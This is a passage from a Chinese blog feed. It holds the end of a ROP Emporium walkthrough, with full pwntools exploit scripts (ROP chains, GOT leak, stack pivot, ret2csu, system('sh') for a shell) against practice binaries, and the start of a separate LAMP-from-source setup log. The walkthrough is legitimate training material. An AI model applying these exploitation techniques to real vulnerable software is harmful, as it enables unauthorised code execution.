&#39;a&#39; * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>利用 <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>这个gadget来控制参数。</p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题跟前面第2题很像，但是就是没有给你<code>cat flag</code> 的字符串了。需要自己用程序的gadget来构造。思路也就是进行rop把<code>/bin/sh</code>往bss段上写,然后接着拿shell就好了。</p><pre><code>ROPgadget --binary ./write4 --only &quot;mov|pop|ret&quot;</code></pre><p><strong>查好用的gadgets：</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>利用这即可就可以了，32位的类似。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-2"><a href="#32位：-2" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./write432&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write432&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 44bss = 0x804A06C-0x10pop_edi_pop_ebp_ret = 0x080486dasystem = 0x8048430key = 0x08048670 #mov dword ptr [edi], ebp ; retpayload = &#39;a&#39; * offset + flat([pop_edi_pop_ebp_ret,bss,&#39;sh\x00\x00&#39;,key,system,0xdeadbeef,bss])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-2"><a href="#64位：-2" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./write4&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write4&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 40bss = 0x601090-0x10key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; retkey2 = 0x0000000000400890# pop r14 ; pop r15 ; retkey3 = 0x0000000000400893#pop rdi ; retsystem = 0x000004005E0payload = &#39;a&#39; * offset + flat([key2,bss,&#39;/bin/sh\x00&#39;,key1,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题目跟前一个write4十分的相似，但是其过滤了个别字符：<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>会将其替换为<code>0xEB</code>，个人解决办法就是在bss段写好被程序处理过的字符串后，在用xor的gadgets来重新改回来，为了便于利用，32位和64位都是构造<code>system(sh)</code>来拿的shell。<br>例子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>传过去的是<code>sh\x00\x00\x00\x00\x00\x00\x00</code> 到bss是这个情况，然后去找xor的gadget：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>其中注意这是以一个byte来进行xor的，然后这个图xor的倒数第一条语句，**其中的是dh，这个是edx的高位。r14b是r14的低位也是一个byte的字节单位。<br>这个题目在gdb调试exp时会发现有比较便捷的办法。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-3"><a href="#32位：-3" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./badchars32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars32&#39;)key1 = 0x08048893# mov dword ptr [edi], esi ; retkey2 = 0x08048899# pop esi ; pop edi ; retkey3 = 0x08048461# pop ebx ; retbss = 0x804A06C-10key4 = 0x08048897# pop ecx ; retkey5 = 0x08048890#xor byte ptr [ebx], cl ; retsys = 0x080484E0offset = 44payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00&#39;,bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-3"><a href="#64位：-3" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./badchars&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars&#39;)offset = 40bss = 0x6010B0key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; retkey2 = 0x0000000000400b3b# pop r12 ; pop r13 ; retkey3 = 0x0000000000400b39#pop rdi ; retkey4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; retkey5 = 0x0000000000400b40#pop r14 ; pop r15 ; retsystem = 0x004006F0payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00\x00\x00\x00\x00&#39;,bss,key1,key5,0x98,bss,key4,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>这个题目还是跟write4很相似，但是找可用的gadget是，比较难找。需要想尽办法找各种gadget，然后叠加在一起成为需要的链。这个题突破口也就在：</p><pre><code>mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。<br>其中64位的找可用gadget，还需要控制一下深度：</p><pre><code>ROPgadget --binary ./fluff --depth 15 </code></pre><p>这样找出足够的gadget，以便自己试用。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-4"><a href="#32位：-4" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./fluff32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff32&#39;)key1 = 0x080483e1# pop ebx ; retkey2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retkey3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retbss = 0x804A06Ckey4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retkey5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; retsys = 0x8048430offset = 44payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;sh\x00\x00&#39;,key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-4"><a href="#64位：-4" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./fluff&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff&#39;)key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; retkey2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retkey3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retbss = 0x601090key4 = 0x0000000000400840##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retkey5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retkey6 = 0x00000000004008c3# pop rdi ; retsys = 0x4005E0offset = 40payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;/bin/sh\x00&#39;,key2,1,key3,1,key5,1,0,key6,bss,sys])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>这个题一看就是栈转移了。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>可以看到会给你泄漏一个堆地址，给你去栈转移。<br>接着看后门函数，发现这里call一个与libc连接的函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p><p>接着分析一下给定的so文件：<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p><pre><code class="c">void __noreturn ret2win(){  system(&quot;/bin/cat flag.txt&quot;);  exit(0);}</code></pre><p>接着就有思路了，栈转移到给你的堆地址上，然后构造rop链：</p><ul><li>leak <code>foothold_function_got</code></li><li>算出给的libc基址，回到start，再次利用漏洞</li><li>构造jmp到ret2win的链即可<br>但是这个题目还是有技巧的，发现给你的堆地址其实跟这个libc的内存映射是很近的，并且每次差距也是固定的。那就可以直接分析so文件，来算取偏移，直接利用。</li></ul><p>根据给的堆地址和so文件映射基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32位：-5"><a href="#32位：-5" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)libc = ELF(&#39;./libpivot32.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x080486a8 #: leave ; retio.recvuntil(&#39;0x&#39;)leak = int(io.recv(8),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p32(leak) +p32(key1)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = u32(io.recv(4))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)payload = &#39;a&#39; * 44 + p32(ret2win)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-5"><a href="#64位：-5" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]offset = libc.symbols[&#39;foothold_function&#39;] - libc.symbols[&#39;ret2win&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x0000000000400a39 #: leave ; retkey2 = 0x0000000000400b73#pop rdi ; retkey3 = 0x0000000000400b02#xchg rax, rsp ; retkey4 = 0x0000000000400b00#pop rax ; retprint(&#39;offset:&#39; + hex(offset))io.recvuntil(&#39;0x&#39;)leak = int(io.recv(12),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p64(key4)+ p64(leak) + p64(key3)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = int(u64(io.recv(6).ljust(8,&#39;\x00&#39;)))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]print(&#39;ret2win&#39;+ hex(ret2win))# raw_input(&#39;-&gt;&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(ret2win)io.sendline(payload)io.interactive()</code></pre><p>这个地方因为是fgets函数来获取字符串，其遇到换行就会结束，但是在找gadgat 的时候发现<code>leave ret</code>的这个gadget，地址都是有<code>0x0a</code>,所以只能更换gadget，来伪造栈。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32位：-6"><a href="#32位：-6" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)offset = 44io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(8),16) + 1921272 + 0x000000967print(&#39;leak&#39;+ hex(leak1))raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p32(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-6"><a href="#64位：-6" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)offset = 40io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(12),16) + 3977456 + libc.symbols[&#39;ret2win&#39;]raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p64(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>这个题目就是再考ret2csu（64位的万能gadget），让你控制rdx（第三个参数的寄存器）为<code>0xdeadcafebabebeef</code> 就可以了。但是比较难搞的一点是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>在这个地方是call，所以这里应该填一个got的地址。不能是一个地址或者plt。因为<code>call 0xaaaaa</code> 汇编作用：</p><ul><li>push PC（也就是该汇编指令的下一个汇编指令的地址）</li><li><code>jmp [0xaaaaa]</code> 是该函数point指向的地址</li></ul><p>这个题目在call完每一个函数自带的正常库函数后，都将其got表清0。<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>但是会发现上面还有一个动态链接<code>_DYNAMIC</code>的信息，跟进去：<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>发现一堆初始化用的函数。然后点进去第一个可以看看：<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>发现这里也没有对rdx进行处理，可以使用这个。现在就是确定一下哪里存放着<code>0x400560</code>，毫无疑问肯定是这个<code>_DYNAMIC</code>里，但是自己目前还不熟悉这个结构，看起来貌似是个结构体。先gdb跟入查看吧：<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>发现应该是<code>0x0600E38</code>。接下来的就简单了，传统的ret2csu。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./ret2csu&#39;)elf = ELF(&#39;./ret2csu&#39;)offset = 40io.recvuntil(&#39;&gt;&#39;)key1 = 0x040089Akey2 = 0x000400880key3 = 0x0000600E38raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*&#39;a&#39;,0x000004007B1])io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ropemporium-通关记录&quot;&gt;&lt;a href=&quot;#Ropemporium-通关记录&quot; class=&quot;headerlink&quot; title=&quot;Ropemporium 通关记录&quot;&gt;&lt;/a&gt;Ropemporium 通关记录&lt;/h1&gt;&lt;h2 id=&quot;ret2win&quot;&gt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>linux- Lamp搭建记录</title>
    <link href="http://chumen77.xyz/2020/04/08/linux_%20Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/04/08/linux_ Lamp搭建记录/</id>
    <published>2020-04-08T06:24:44.064Z</published>
    <updated>2020-04-15T14:16:28.952Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lamp搭建记录"><a href="#Lamp搭建记录" class="headerlink" title="Lamp搭建记录"></a>Lamp搭建记录</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装编译环境："><a href="#安装编译环境：" class="headerlink" title="安装编译环境："></a>安装编译环境：</h3><pre><code>yum -y install gcc*</code></pre><p>安装好后记得关闭防火墙和selinux</p><h3 id="准备软件包"><a href="#准备软件包" class="headerlink" title="准备软件包"></a>准备软件包</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/phSpwE.png" srcset="/img/loading.gif" alt><br>把这些安装包都放入虚拟机自定义的路径，等待使用。</p><h3 id="shell脚本批量解包"><a href="#shell脚本批量解包" class="headerlink" title="shell脚本批量解包"></a>shell脚本批量解包</h3><pre><code class="bash">#!/bin/bash/bin/ls *tar.gz &gt; ls.list/bin/ls *tgz &gt;&gt; ls.listfor a in `cat ls.list`do        /bin/tar -zxf $adonerm -rf ls.list</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/YX4fnr.png" srcset="/img/loading.gif" alt><br>然后开始一一的装包，注意需要按照一定的顺序来装的。</p><h2 id="python-devel"><a href="#python-devel" class="headerlink" title="python-devel"></a>python-devel</h2><pre><code class="bash">yum -y install python-devel</code></pre><p>安装python的底层环境。</p><pre><code class="bash">[root@localhost lamp1]# cd libxml2-2.9.1/[root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/[root@localhost libxml2-2.9.1]# make[root@localhost libxml2-2.9.1]# make install</code></pre><h2 id="libmcrypt"><a href="#libmcrypt" class="headerlink" title="libmcrypt"></a>libmcrypt</h2><p>提供一些加密算法：</p><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/[root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/[root@localhost libmcrypt-2.5.8]# make[root@localhost libmcrypt-2.5.8]# make install</code></pre><h2 id="libltdl"><a href="#libltdl" class="headerlink" title="libltdl"></a>libltdl</h2><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/[root@localhost libltdl]# ./configure --enable-ltdl-install[root@localhost libltdl]# make[root@localhost libltdl]# make install</code></pre><h2 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h2><p>提供加密方式的扩展</p><pre><code class="bash">[root@localhost lamp1]# cd mhash-0.9.9.9/[root@localhost mhash-0.9.9.9]# ./configure</code></pre><h2 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt"></a>mcrypt</h2><p>提供php相关的加密支持拓展库</p><pre><code class="bash">[root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcrypt[root@localhost mcrypt-2.6.8]# make[root@localhost mcrypt-2.6.8]# make install</code></pre><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h2><p>提供压缩用途的函数库</p><pre><code class="bash">[roott@localhost lamp1]# cd zlib-1.2.3/[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install</code></pre><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><pre><code class="bash">[root@localhost zlib-1.2.3]# cd ../[root@localhost lamp1]# cd libpng-1.2.31/[root@localhost libpng-1.2.31]# ./configure --prefix=/usr/local/libpng[root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install</code></pre><p>如果出现：</p><pre><code class="bash">/usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata&#39; can not be used when making a shared object; recompile with -fPIC</code></pre><p>解决办法 ： </p><pre><code class="bash">[root@localhost lamp1]# cd zlib-1.2.3 //进入zlib目录[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# CFLAGS=&quot;-O3 -fPIC&quot; ./configure   --prefix=/usr/local/zlib/ #使用64位元的方法进行编译[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install[root@localhost zlib-1.2.3]# make clean</code></pre><p>然后在重新来安装libpng即可。</p><h2 id="jpeg6"><a href="#jpeg6" class="headerlink" title="jpeg6"></a>jpeg6</h2><p>提供jpeg格式的图片</p><pre><code class="bash">[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include[root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1</code></pre><pre><code class="bash">root@localhost lamp]# cd jpeg-6b/[root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</code></pre><p>如果发生这样的报错：</p><pre><code class="bash">[root@localhost jpeg-6b]# make./libtool --mode=compile gcc -O2  -I. -c ./jcapimin.cmake: ./libtool：命令未找到make: *** [jcapimin.lo] 错误 127</code></pre><p>需要：</p><pre><code class="bash">[root@localhost jpeg-6b]# yum -y install libtool[root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess .cp：是否覆盖&quot;./config.guess&quot;？ yes[root@localhost jpeg-6b]# make clean</code></pre><p>重新再来就好。</p><h2 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h2><p>字体库。</p><pre><code class="bash">[root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype</code></pre><h2 id="GD"><a href="#GD" class="headerlink" title="GD"></a>GD</h2><p>给php提供图形拓展的库</p><pre><code class="bash">[root@localhost lamp]# mkdir /usr/local/gd2[root@localhost lamp]# cd /usr/src/lamp/gd-2.0.35/[root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/</code></pre><p>这样会爆一个错，然后需要改一下源码：</p><pre><code class="bash">[root@localhost gd-2.0.35]# vim gd_png.c</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/3NJrzC.png" srcset="/img/loading.gif" alt><br>需要指定一下路径即可，这个刚刚是已经安装过的。</p><h2 id="httped"><a href="#httped" class="headerlink" title="httped"></a>httped</h2><p>先装两个工具包：</p><pre><code>cp -r apr-1.4.6 httpd-2.4.7/srclib/aprcp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util</code></pre><h3 id="开始装httped："><a href="#开始装httped：" class="headerlink" title="开始装httped："></a>开始装httped：</h3><p>先进入装一下pcre：</p><pre><code>./configuremakemake install</code></pre><p>进入httped：<br>先对配置进行设置：</p><pre><code>./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=sharedmakemake install</code></pre><h3 id="开服务："><a href="#开服务：" class="headerlink" title="开服务："></a>开服务：</h3><pre><code>/usr/local/apache2/bin/apachectl start</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hdY4Sy.png" srcset="/img/loading.gif" alt></p><h3 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h3><pre><code>[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/eqeQsw.png" srcset="/img/loading.gif" alt></p><p>设置开机时自动启动这个服务。</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h3><p>装两个工具：</p><pre><code>[root@localhost local]# yum -y install cmake[root@localhost local]# yum -y install bison[root@localhost local]# yum -y install ncurses-devel</code></pre><p>建立一个用户：</p><pre><code>[root@localhost local]# useradd mysql[root@localhost local]# id mysqluid=1001(mysql) gid=1001(mysql) 组=1001(mysql)</code></pre><p>安装ncurses：</p><pre><code>[root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite[root@localhost ncurses-5.9]# make[root@localhost ncurses-5.9]# make install</code></pre><h3 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h3><pre><code>[root@localhost mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \&gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \&gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \&gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \&gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \&gt; -DMYSQL_TCP_PORT=3306</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/kEl78g.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost  mysql-5.5.23]# make[root@localhost  mysql-5.5.23]# make install</code></pre><h3 id="简单设置"><a href="#简单设置" class="headerlink" title="简单设置"></a>简单设置</h3><p>初始化mysql：</p><pre><code>[root@localhost mysql]# chown -R mysql:mysql .[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PIJriB.png" srcset="/img/loading.gif" alt><br>设置权限：</p><pre><code>[root@localhost mysql]# chown -R root .[root@localhost mysql]# chown -R mysql data/</code></pre><p>覆盖一下配置文件：</p><pre><code>[root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnfcp：是否覆盖&quot;/etc/my.cnf&quot;？ yes</code></pre><p>接着初始化：</p><pre><code>[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql200408 03:38:45 mysqld_safe Logging to &#39;/usr/local/mysql/data/localhost.localdomain.err&#39;.200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p>发现卡死了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/1KP1pE.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# ps aux | grep mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hNLN8i.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# kill -9 102872[root@localhost mysql-5.5.23]# ps aux | grep mysqlmysql    103111  0.0  4.9 727288 49260 pts/3    Sl   03:39   0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306root     103201  0.0  0.0 112728   972 pts/2    S+   03:46   0:00 grep --color=auto mysql</code></pre><p>杀掉重新来。<br><img src="http://qiqianyun.chumen77.xyz/uPic/CoNvVo.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/a9Mt08.png" srcset="/img/loading.gif" alt><br>成功了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/fUs1Vd.png" srcset="/img/loading.gif" alt></p><h3 id="自启动-1"><a href="#自启动-1" class="headerlink" title="自启动"></a>自启动</h3><pre><code>[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/HTfqIB.png" srcset="/img/loading.gif" alt></p><h3 id="设置mysql密码"><a href="#设置mysql密码" class="headerlink" 